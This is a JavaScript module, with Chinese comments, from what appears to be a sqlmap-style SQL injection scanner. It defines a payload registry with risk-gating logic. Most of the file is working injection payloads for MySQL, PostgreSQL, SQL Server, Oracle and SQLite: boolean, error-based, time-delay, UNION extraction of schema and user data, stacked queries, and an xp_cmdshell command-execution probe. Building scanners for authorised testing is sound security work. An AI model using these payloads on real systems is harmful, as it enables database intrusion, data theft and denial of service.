// ==================== 声明式 Payload 注册表（对标 sqlmap XML <test> 元素） ====================
// sqlmap 用 XML 描述每条 payload 的 level/risk/dbms/clause 依赖；本项目用纯 JS 对象实现等价声明。
// 每条声明对应 sqlmap 的一个 <test>：id / dbms / technique / level / risk / clause / boundary /
// template（真模板）+ falseTemplate（假模板，布尔对）/ where（注入位置）。
//
// 与旧版 PAYLOADS（payloads.js）的关系：
//   - PAYLOADS 为扁平「dbms → technique → 模板数组」结构，继续原样工作（向后兼容，零回归）；
//   - PAYLOAD_REGISTRY 为声明式扁平列表，模板从 PAYLOADS 核心向量提取，加上 level/risk/clause/boundary
//     元数据，供 selectPayloads() 按 sqlmap 语义筛选。
//
// 分级约定（对标 sqlmap）：
//   level 1-5：复杂度/边界探测深度（1 默认，5 全量）
//   risk  1-3：破坏性（1 仅安全向量；2 含 OR 变体/时间；3 含注释符变体/极限向量）
//   where: 'value'=值位置注入（谓词值），'position'=位置注入（ORDER BY / LIMIT 列位置）
//
// 版本分支（[P2-2] 对标 sqlmap 版本感知）：
//   条目可声明 minVersion/maxVersion（数字或 {major,minor}）标注适用版本区间，
//   selectPayloads 按 ctx.dbmsVersion（指纹阶段解析）过滤；版本未知 → 不过滤（保守投放）。

import { AsyncLocalStorage } from 'node:async_hooks';
import { versionAtLeast, versionBelow } from './dbmsVersion.js';
import { DESTRUCTIVE_PAYLOADS } from './payloads/destructive.js';

// ============================================================================
// [P0-FIX 2026-09-09] 高危（destructive）池投放策略 —— productionMode 硬门
// ----------------------------------------------------------------------------
// 为什么要这一层：注册表里 id 带 `-dest-` 的条目（以及模板与 payloads/destructive.js 同源的条目）
// 就是 INTO OUTFILE 写文件 / LOAD_FILE·pg_read_file 任意文件读 / xp_cmdshell·COPY TO PROGRAM·
// load_extension 命令执行 / sp_configure 永久改服务器配置 / GET_LOCK·BENCHMARK·RANDOMBLOB DoS /
// OPENROWSET·UTL_HTTP 外连。此前**只看 risk**：用户把 risk 拖到 3（前端一个滑条），下一轮扫描就把
// 这些模板打进客户生产库 ——「开关有名无实」的反面：开关有实无门。而扇平路径又完全不投放（同一个
// risk=3 两种后果），两者都不可接受。现统一为：生产环境下投放高危池必须 confirmDestructive===true。
//
// 策略传递通道：Detection 侧调用方（ErrorDetector / TimeBlindDetector）只传 dbms/technique/level/risk/
// testFilter/testSkip 六个字段给 selectPayloads，而这两个检测器属于禁改文件 → 无法从签名上接新参数。
// 故用 AsyncLocalStorage 做「一次扫描一个策略」的上下文注入（ScanManager._run 建立），
// 而不是进程级可变全局：并发扫描各拿各的 policy，不会 A 扫描的 confirm 泄漏给 B 扫描。
//
// 兼容性红线：**无显式参数且无扫描上下文时不施加门禁**（保持旧筛选语义）——否则直调
// selectPayloads 的现有单测（tests/unit/registryFilter.test.js：risk=3 应返回全量）会被误伤。
// 真实扫描路径总是经过 ScanManager._run，因此总是带策略 → 默认 fail-closed。
// ============================================================================

// destructive.js 里的模板集（注册表的 -dest- 条目即由它同源生成，用内容而不是只靠 id 字串判定）
const DESTRUCTIVE_TEMPLATES = new Set(
  Object.values(DESTRUCTIVE_PAYLOADS).flatMap((byTech) => Object.values(byTech).flat())
);
const DESTRUCTIVE_ID_RE = /(?:^|-)dest-/;

// 判定一条注册表条目是否属于高危池（id 带 -dest- 或模板与 destructive 池同串）。
// falseTemplate 一并查：高危池目前无假对，但防后续补条目时绕过判定。
export function isDestructivePayload(entry) {
  if (!entry || typeof entry !== 'object') return false;
  if (DESTRUCTIVE_ID_RE.test(String(entry.id || ''))) return true;
  for (const tpl of [entry.template, entry.falseTemplate]) {
    if (typeof tpl === 'string' && DESTRUCTIVE_TEMPLATES.has(tpl)) return true;
  }
  return false;
}

const destructivePolicyStore = new AsyncLocalStorage();

/**
 * 在指定高危池策略下执行 fn（ScanManager._run 包裹整个扫描流水线的入口）。
 * @param {{productionMode?:boolean, confirmDestructive?:boolean}} policy
 * @param {() => any} fn
 */
export function runWithDestructivePolicy(policy, fn) {
  return destructivePolicyStore.run({ ...(policy || {}) }, fn);
}

/** 读取当前上下文的高危池策略（非扫描上下文返回 null） */
export function currentDestructivePolicy() {
  return destructivePolicyStore.getStore() || null;
}

/**
 * 解析本次筛选的高危池放行结论。返回 null = 不施加门禁（无策略上下文且调用方未显式传参）。
 * @param {{productionMode?:boolean, confirmDestructive?:boolean}} args selectPayloads 入参
 */
function resolveDestructiveGate(args = {}) {
  const explicit = args.productionMode !== undefined || args.confirmDestructive !== undefined;
  const policy = destructivePolicyStore.getStore();
  if (!explicit && !policy) return null;
  const productionMode =
    args.productionMode !== undefined ? args.productionMode !== false : policy?.productionMode !== false;
  const confirmDestructive =
    args.confirmDestructive !== undefined
      ? args.confirmDestructive === true
      : policy?.confirmDestructive === true;
  // 生产模式：必须显式确认；脱离生产护栏（productionMode=false）：保持旧语义（risk>=3 即投放）
  return { allowed: !productionMode || confirmDestructive, productionMode, confirmDestructive };
}

/** @type {Array<{id:string, dbms:string[], technique:string, level:number, risk:number,
 *  clause:string[], boundary:string[], template:string, falseTemplate?:string, where:string,
 *  minVersion?:number|{major:number,minor?:number}, maxVersion?:number|{major:number,minor?:number}}>} */
export const PAYLOAD_REGISTRY = [
  // ==================== MySQL（base）+ MariaDB / TiDB ====================
  { id: 'mysql-bool-sq-1', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'boolean', level: 1, risk: 1, clause: ['where'], boundary: ['', "'", ')'], template: '{ORIG} AND 1=1', falseTemplate: '{ORIG} AND 1=2', where: 'value' },
  { id: 'mysql-bool-sq-2', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'boolean', level: 1, risk: 1, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND '1'='1", falseTemplate: "{ORIG}' AND '1'='2", where: 'value' },
  { id: 'mysql-bool-dq-1', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'boolean', level: 1, risk: 1, clause: ['where'], boundary: ['"'], template: '{ORIG}" AND "1"="1', falseTemplate: '{ORIG}" AND "1"="2', where: 'value' },
  { id: 'mysql-bool-comment-1', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'boolean', level: 2, risk: 3, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND 1=1#", falseTemplate: "{ORIG}' AND 1=2#", where: 'value' },
  { id: 'mysql-bool-or-1', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'boolean', level: 2, risk: 2, clause: ['where'], boundary: ["'"], template: "{ORIG}' OR '1'='1", falseTemplate: "{ORIG}' OR '1'='2", where: 'value' },
  { id: 'mysql-bool-orderby-1', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'boolean', level: 3, risk: 1, clause: ['orderby'], boundary: [''], template: '{ORIG} ORDER BY 1-- -', falseTemplate: '{ORIG} ORDER BY 1,2-- -', where: 'position' },
  { id: 'mysql-err-extract-1', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'error', level: 1, risk: 1, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -", where: 'value' },
  { id: 'mysql-err-updatexml-1', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'error', level: 1, risk: 1, clause: ['where'], boundary: ['"'], template: '{ORIG}" AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -', where: 'value' },
  { id: 'mysql-err-floorrand-1', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'error', level: 2, risk: 2, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", where: 'value' },
  // [版本分支] MySQL 5.7.8+ 才有 JSON 类型：CAST(target AS JSON) 对非 JSON 串报错并回显内容。
  // 价值：extractvalue/updatexml 被 WAF 关键字拦截时的报错回显替代路径。
  { id: 'mysql-err-json-1', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'error', level: 2, risk: 1, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND CAST((SELECT version()) AS JSON)-- -", where: 'value', minVersion: 5.7 },
  { id: 'mysql-err-json-2', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'error', level: 2, risk: 1, clause: ['where'], boundary: ["')"], template: "{ORIG}') AND CAST((SELECT version()) AS JSON)-- -", where: 'value', minVersion: 5.7 },
  { id: 'mysql-time-sleep-1', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'time', level: 1, risk: 2, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND SLEEP({SLEEP})-- -", where: 'value' },
  { id: 'mysql-time-sleep-2', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'time', level: 2, risk: 2, clause: ['where'], boundary: ["')"], template: "{ORIG}') AND SLEEP({SLEEP})-- -", where: 'value' },
  { id: 'mysql-time-benchmark-1', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'time', level: 3, risk: 2, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND BENCHMARK({SLEEP}0000000,MD5('a'))-- -", where: 'value' },
  { id: 'mysql-union-1', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'union', level: 1, risk: 1, clause: ['where'], boundary: [''], template: '{ORIG} UNION SELECT {NUM},database(),version()-- -', where: 'value' },
  { id: 'mysql-union-2', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'union', level: 2, risk: 1, clause: ['where'], boundary: ["')"], template: "{ORIG}') UNION SELECT {NUM},database(),version()-- -", where: 'value' },
  { id: 'mysql-stacked-1', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'stacked', level: 3, risk: 2, clause: ['where'], boundary: [';'], template: '{ORIG}; SELECT SLEEP({SLEEP}) {SEP}', where: 'value' },

  // ==================== 集合运算探针（[D.1 补全 2026-09-12] INTERSECT/EXCEPT 通道） ====================
  // 实战价值：WAF 常以关键字 `UNION` 做拦截正则，`INTERSECT/EXCEPT/MINUS` 集合运算不在同一
  // 特征族内——`{ORIG} INTERSECT SELECT 1-- -`（真：合法、结果集不变 ≈ 基线）与
  // `{ORIG} EXCEPT SELECT 1-- -`（假：EXCEPT 空集在等值查询下仍 ≈ 基线，故改用「真=1 行、
  // 假=0 行」的谓词形态）。真假对统一用「INTERSECT 保留行数差异」构造：
  //   真：{ORIG} INTERSECT SELECT {ORIG}     → 右侧含原值 → 保留原行 ≈ 基线
  //   假：{ORIG} INTERSECT SELECT {ORIG}+1   → 右侧无原值 → 空集 ≠ 基线（数值型）
  // 需要目标列数兼容（SELECT 单列标量与原查询首列同型），故 level=4、where='value'，
  // 仅深度扫描时作为 UNION 被关键字拦截后的替代探测通道。MySQL 8.x 不支持 INTERSECT/EXCEPT
  // （仅 UNION），故不设 MySQL 条目；MariaDB 10.3+/PG/SQLite/MSSQL/Oracle 支持。
  { id: 'pg-bool-setops-1', dbms: ['PostgreSQL'], technique: 'boolean', level: 4, risk: 1, clause: ['where'], boundary: [''], template: '{ORIG} INTERSECT SELECT {ORIG}-- -', falseTemplate: '{ORIG} INTERSECT SELECT {ORIG}+1-- -', where: 'value' },
  { id: 'mssql-bool-setops-1', dbms: ['SQL Server'], technique: 'boolean', level: 4, risk: 1, clause: ['where'], boundary: [''], template: '{ORIG} INTERSECT SELECT {ORIG}', falseTemplate: '{ORIG} INTERSECT SELECT {ORIG}+1', where: 'value' },
  { id: 'sqlite-bool-setops-1', dbms: ['SQLite'], technique: 'boolean', level: 4, risk: 1, clause: ['where'], boundary: [''], template: '{ORIG} INTERSECT SELECT {ORIG}-- -', falseTemplate: '{ORIG} INTERSECT SELECT {ORIG}+1-- -', where: 'value' },
  { id: 'maria-bool-setops-1', dbms: ['MariaDB'], technique: 'boolean', level: 4, risk: 1, clause: ['where'], boundary: [''], template: '{ORIG} INTERSECT SELECT {ORIG}', falseTemplate: '{ORIG} INTERSECT SELECT {ORIG}+1', where: 'value', minVersion: { major: 10, minor: 3 } },
  { id: 'ora-bool-setops-1', dbms: ['Oracle'], technique: 'boolean', level: 4, risk: 1, clause: ['where'], boundary: [''], template: '{ORIG} INTERSECT SELECT {ORIG} FROM DUAL', falseTemplate: '{ORIG} INTERSECT SELECT {ORIG}+1 FROM DUAL', where: 'value' },
  // ==================== PostgreSQL ====================
  { id: 'pg-bool-sq-1', dbms: ['PostgreSQL'], technique: 'boolean', level: 1, risk: 1, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND '1'='1", falseTemplate: "{ORIG}' AND '1'='2", where: 'value' },
  { id: 'pg-bool-dq-1', dbms: ['PostgreSQL'], technique: 'boolean', level: 1, risk: 1, clause: ['where'], boundary: ['"'], template: '{ORIG}" AND "1"="1', falseTemplate: '{ORIG}" AND "1"="2', where: 'value' },
  { id: 'pg-bool-num-1', dbms: ['PostgreSQL'], technique: 'boolean', level: 1, risk: 1, clause: ['where'], boundary: [''], template: '{ORIG} AND 1=1', falseTemplate: '{ORIG} AND 1=2', where: 'value' },
  { id: 'pg-bool-or-1', dbms: ['PostgreSQL'], technique: 'boolean', level: 2, risk: 2, clause: ['where'], boundary: ["'"], template: "{ORIG}' OR '1'='1", falseTemplate: "{ORIG}' OR '1'='2", where: 'value' },
  { id: 'pg-bool-orderby-1', dbms: ['PostgreSQL'], technique: 'boolean', level: 3, risk: 1, clause: ['orderby'], boundary: [''], template: '{ORIG},(SELECT 1)-- -', falseTemplate: '{ORIG},(SELECT 1/0)-- -', where: 'position' },
  { id: 'pg-err-cast-1', dbms: ['PostgreSQL'], technique: 'error', level: 1, risk: 1, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND CAST((SELECT version()) AS int)-- -", where: 'value' },
  { id: 'pg-err-cast-bool-1', dbms: ['PostgreSQL'], technique: 'error', level: 2, risk: 1, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND CAST((SELECT current_user) AS boolean)-- -", where: 'value' },
  { id: 'pg-err-floorrand-1', dbms: ['PostgreSQL'], technique: 'error', level: 2, risk: 2, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -", where: 'value' },
  { id: 'pg-time-1', dbms: ['PostgreSQL'], technique: 'time', level: 1, risk: 2, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND pg_sleep({SLEEP})-- -", where: 'value' },
  { id: 'pg-time-2', dbms: ['PostgreSQL'], technique: 'time', level: 2, risk: 2, clause: ['where'], boundary: ["')"], template: "{ORIG}') AND pg_sleep({SLEEP})-- -", where: 'value' },
  { id: 'pg-time-orderby-1', dbms: ['PostgreSQL'], technique: 'time', level: 3, risk: 2, clause: ['orderby'], boundary: [''], template: '{ORIG},(SELECT pg_sleep({SLEEP}))-- -', where: 'position' },
  // [版本分支] pg_sleep_for 为 PG 9.6+ 引入（interval 版），pg_sleep 被 WAF 特征拦时作替代向量
  { id: 'pg-time-sleepfor-1', dbms: ['PostgreSQL'], technique: 'time', level: 2, risk: 2, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND pg_sleep_for('{SLEEP} seconds')-- -", where: 'value', minVersion: 9.6 },
  { id: 'pg-union-1', dbms: ['PostgreSQL'], technique: 'union', level: 1, risk: 1, clause: ['where'], boundary: [''], template: '{ORIG} UNION SELECT {NUM},version(),current_user-- -', where: 'value' },
  { id: 'pg-union-2', dbms: ['PostgreSQL'], technique: 'union', level: 2, risk: 1, clause: ['where'], boundary: ["')"], template: "{ORIG}') UNION SELECT {NUM},version(),current_user-- -", where: 'value' },
  { id: 'pg-stacked-1', dbms: ['PostgreSQL'], technique: 'stacked', level: 3, risk: 2, clause: ['where'], boundary: [';'], template: '{ORIG}; SELECT pg_sleep({SLEEP}) {SEP}', where: 'value' },

  // ==================== SQL Server ====================
  { id: 'mssql-bool-sq-1', dbms: ['SQL Server'], technique: 'boolean', level: 1, risk: 1, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND '1'='1", falseTemplate: "{ORIG}' AND '1'='2", where: 'value' },
  { id: 'mssql-bool-dq-1', dbms: ['SQL Server'], technique: 'boolean', level: 1, risk: 1, clause: ['where'], boundary: ['"'], template: '{ORIG}" AND "1"="1', falseTemplate: '{ORIG}" AND "1"="2', where: 'value' },
  { id: 'mssql-bool-num-1', dbms: ['SQL Server'], technique: 'boolean', level: 1, risk: 1, clause: ['where'], boundary: [''], template: '{ORIG} AND 1=1', falseTemplate: '{ORIG} AND 1=2', where: 'value' },
  { id: 'mssql-bool-or-1', dbms: ['SQL Server'], technique: 'boolean', level: 2, risk: 2, clause: ['where'], boundary: ["'"], template: "{ORIG}' OR '1'='1", falseTemplate: "{ORIG}' OR '1'='2", where: 'value' },
  { id: 'mssql-bool-update-1', dbms: ['SQL Server'], technique: 'boolean', level: 3, risk: 2, clause: ['update'], boundary: [''], template: '{ORIG},1=1-- -', falseTemplate: '{ORIG},1=2-- -', where: 'position' },
  { id: 'mssql-err-convert-1', dbms: ['SQL Server'], technique: 'error', level: 1, risk: 1, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -", where: 'value' },
  { id: 'mssql-err-cast-1', dbms: ['SQL Server'], technique: 'error', level: 1, risk: 1, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT DB_NAME()) AS int)-- -", where: 'value' },
  { id: 'mssql-err-xml-1', dbms: ['SQL Server'], technique: 'error', level: 2, risk: 2, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND (SELECT (SELECT DB_NAME() FOR XML PATH(''))).value('a','int')-- -", where: 'value' },
  { id: 'mssql-err-xpcmdshell-1', dbms: ['SQL Server'], technique: 'error', level: 5, risk: 3, clause: ['where'], boundary: ["'"], template: "{ORIG}'; EXEC xp_cmdshell 'whoami'-- -", where: 'value' },
  { id: 'mssql-time-waitfor-1', dbms: ['SQL Server'], technique: 'time', level: 1, risk: 2, clause: ['where'], boundary: ["';"], template: "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}'-- -", where: 'value' },
  { id: 'mssql-time-waitfor-2', dbms: ['SQL Server'], technique: 'time', level: 2, risk: 2, clause: ['where'], boundary: ['";'], template: '{ORIG}"; WAITFOR DELAY "0:0:{SLEEP}"-- -', where: 'value' },
  { id: 'mssql-time-paren-1', dbms: ['SQL Server'], technique: 'time', level: 3, risk: 2, clause: ['where'], boundary: ["');"], template: "{ORIG}'); WAITFOR DELAY '0:0:{SLEEP}'-- -", where: 'value' },
  { id: 'mssql-union-1', dbms: ['SQL Server'], technique: 'union', level: 1, risk: 1, clause: ['where'], boundary: [''], template: '{ORIG} UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -', where: 'value' },
  { id: 'mssql-union-2', dbms: ['SQL Server'], technique: 'union', level: 2, risk: 1, clause: ['where'], boundary: ["')"], template: "{ORIG}') UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -", where: 'value' },
  { id: 'mssql-stacked-1', dbms: ['SQL Server'], technique: 'stacked', level: 3, risk: 2, clause: ['where'], boundary: [';'], template: '{ORIG}; WAITFOR DELAY \'0:0:{SLEEP}\' {SEP}', where: 'value' },

  // ==================== Oracle ====================
  { id: 'ora-bool-sq-1', dbms: ['Oracle'], technique: 'boolean', level: 1, risk: 1, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND '1'='1", falseTemplate: "{ORIG}' AND '1'='2", where: 'value' },
  { id: 'ora-bool-num-1', dbms: ['Oracle'], technique: 'boolean', level: 1, risk: 1, clause: ['where'], boundary: [''], template: '{ORIG} AND 1=1', falseTemplate: '{ORIG} AND 1=2', where: 'value' },
  { id: 'ora-bool-dq-1', dbms: ['Oracle'], technique: 'boolean', level: 1, risk: 1, clause: ['where'], boundary: ['"'], template: '{ORIG}" AND "1"="1', falseTemplate: '{ORIG}" AND "1"="2', where: 'value' },
  { id: 'ora-bool-or-1', dbms: ['Oracle'], technique: 'boolean', level: 2, risk: 2, clause: ['where'], boundary: ["'"], template: "{ORIG}' OR '1'='1", falseTemplate: "{ORIG}' OR '1'='2", where: 'value' },
  { id: 'ora-err-ctxsys-1', dbms: ['Oracle'], technique: 'error', level: 2, risk: 1, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -", where: 'value' },
  // [版本分支] JSON_VALUE 为 Oracle 12.1.0.2+ 引入：对非 JSON 内容报错并回显（CTXSYS 被禁用时的替代）
  { id: 'ora-err-json-1', dbms: ['Oracle'], technique: 'error', level: 2, risk: 1, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND 1=(SELECT JSON_VALUE((SELECT banner FROM v$version WHERE ROWNUM=1),'$.a') FROM dual)-- -", where: 'value', minVersion: 12 },
  { id: 'ora-err-utl-1', dbms: ['Oracle'], technique: 'error', level: 2, risk: 1, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -", where: 'value' },
  { id: 'ora-err-xmltype-1', dbms: ['Oracle'], technique: 'error', level: 3, risk: 2, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND 1=XMLTYPE('<?xml version=\"1.0\"?><a>'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'</a>').getDocumentVal()-- -", where: 'value' },
  { id: 'ora-time-pipe-1', dbms: ['Oracle'], technique: 'time', level: 1, risk: 2, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -", where: 'value' },
  { id: 'ora-time-lock-1', dbms: ['Oracle'], technique: 'time', level: 3, risk: 2, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND (SELECT DBMS_LOCK.SLEEP({SLEEP}) FROM dual) IS NULL-- -", where: 'value' },
  { id: 'ora-time-paren-1', dbms: ['Oracle'], technique: 'time', level: 2, risk: 2, clause: ['where'], boundary: ["')"], template: "{ORIG}') AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -", where: 'value' },
  { id: 'ora-union-1', dbms: ['Oracle'], technique: 'union', level: 1, risk: 1, clause: ['where'], boundary: [''], template: '{ORIG} UNION SELECT {NUM},banner,NULL FROM v$version-- -', where: 'value' },
  { id: 'ora-union-2', dbms: ['Oracle'], technique: 'union', level: 2, risk: 1, clause: ['where'], boundary: ["')"], template: "{ORIG}') UNION SELECT {NUM},banner,NULL FROM v$version-- -", where: 'value' },
  { id: 'ora-union-sysctx-1', dbms: ['Oracle'], technique: 'union', level: 3, risk: 1, clause: ['where'], boundary: [''], template: "{ORIG} UNION SELECT {NUM},SYS_CONTEXT('USERENV','SESSION_USER'),NULL FROM dual-- -", where: 'value' },
  // Oracle 标准驱动不支持堆叠查询，不声明 stacked 条目

  // ==================== SQLite ====================
  { id: 'lite-bool-sq-1', dbms: ['SQLite'], technique: 'boolean', level: 1, risk: 1, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND '1'='1", falseTemplate: "{ORIG}' AND '1'='2", where: 'value' },
  { id: 'lite-bool-dq-1', dbms: ['SQLite'], technique: 'boolean', level: 1, risk: 1, clause: ['where'], boundary: ['"'], template: '{ORIG}" AND "1"="1', falseTemplate: '{ORIG}" AND "1"="2', where: 'value' },
  { id: 'lite-bool-num-1', dbms: ['SQLite'], technique: 'boolean', level: 1, risk: 1, clause: ['where'], boundary: [''], template: '{ORIG} AND 1=1', falseTemplate: '{ORIG} AND 1=2', where: 'value' },
  { id: 'lite-bool-or-1', dbms: ['SQLite'], technique: 'boolean', level: 2, risk: 2, clause: ['where'], boundary: ["'"], template: "{ORIG}' OR '1'='1", falseTemplate: "{ORIG}' OR '1'='2", where: 'value' },
  { id: 'lite-err-func-1', dbms: ['SQLite'], technique: 'error', level: 1, risk: 1, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND badfunc_sqli_probe()=1-- -", where: 'value' },
  { id: 'lite-err-table-1', dbms: ['SQLite'], technique: 'error', level: 1, risk: 1, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND 1=(SELECT 1 UNION SELECT 2)-- -", where: 'value' },
  { id: 'lite-err-json-1', dbms: ['SQLite'], technique: 'error', level: 3, risk: 1, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND (SELECT json((SELECT group_concat(name) FROM sqlite_master)))-- -", where: 'value' },
  { id: 'lite-time-cross-1', dbms: ['SQLite'], technique: 'time', level: 1, risk: 2, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c)-- -", where: 'value' },
  { id: 'lite-time-cross-2', dbms: ['SQLite'], technique: 'time', level: 2, risk: 2, clause: ['where'], boundary: ["')"], template: "{ORIG}') AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d)-- -", where: 'value' },
  { id: 'lite-time-like-1', dbms: ['SQLite'], technique: 'time', level: 3, risk: 2, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000))))/**/", where: 'value' },
  { id: 'lite-union-1', dbms: ['SQLite'], technique: 'union', level: 1, risk: 1, clause: ['where'], boundary: [''], template: "{ORIG} UNION SELECT {NUM},sqlite_version(),'-- -", where: 'value' },
  { id: 'lite-union-2', dbms: ['SQLite'], technique: 'union', level: 2, risk: 1, clause: ['where'], boundary: ["')"], template: "{ORIG}') UNION SELECT {NUM},sqlite_version(),'-- -", where: 'value' },
  { id: 'lite-union-master-1', dbms: ['SQLite'], technique: 'union', level: 3, risk: 1, clause: ['where'], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT group_concat(name) FROM sqlite_master WHERE type='table'),'-- -", where: 'value' },
  { id: 'lite-stacked-1', dbms: ['SQLite'], technique: 'stacked', level: 3, risk: 2, clause: ['where'], boundary: [';'], template: '{ORIG}; SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d {SEP}', where: 'value' },

  // ==================== Auto-generated expanded entries ====================
  // (Generated from payloads/*.js + destructive.js — covers all payload templates)

  // ---- MySQL ----
  { id: 'mysql-union-100', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},database(),version()-- -", where: 'value' },
  { id: 'mysql-union-101', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" UNION SELECT {NUM},database(),version()-- -", where: 'value' },
  { id: 'mysql-union-102', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: [")"], template: "{ORIG}) UNION SELECT {NUM},database(),version()-- -", where: 'value' },
  { id: 'mysql-union-103', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION ALL SELECT {NUM},database(),version()-- -", where: 'value' },
  { id: 'mysql-union-104', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION ALL SELECT {NUM},database(),version()-- -", where: 'value' },
  { id: 'mysql-union-105', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT {NUM},@@version,user()-- -", where: 'value' },
  { id: 'mysql-union-106', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT {NUM},current_user(),database()-- -", where: 'value' },
  { id: 'mysql-union-107', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},version(),@@datadir-- -", where: 'value' },
  { id: 'mysql-union-108', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),1-- -", where: 'value' },
  { id: 'mysql-union-109', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name=0x7573657273),1-- -", where: 'value' },
  { id: 'mysql-union-110', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},user(),@@basedir-- -", where: 'value' },
  { id: 'mysql-union-111', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) UNION SELECT {NUM},database(),version()-- -", where: 'value' },
  { id: 'mysql-union-112', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: ["\"))"], template: "{ORIG}\")) UNION SELECT {NUM},database(),version()-- -", where: 'value' },
  { id: 'mysql-union-113', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) UNION ALL SELECT {NUM},user(),database()-- -", where: 'value' },
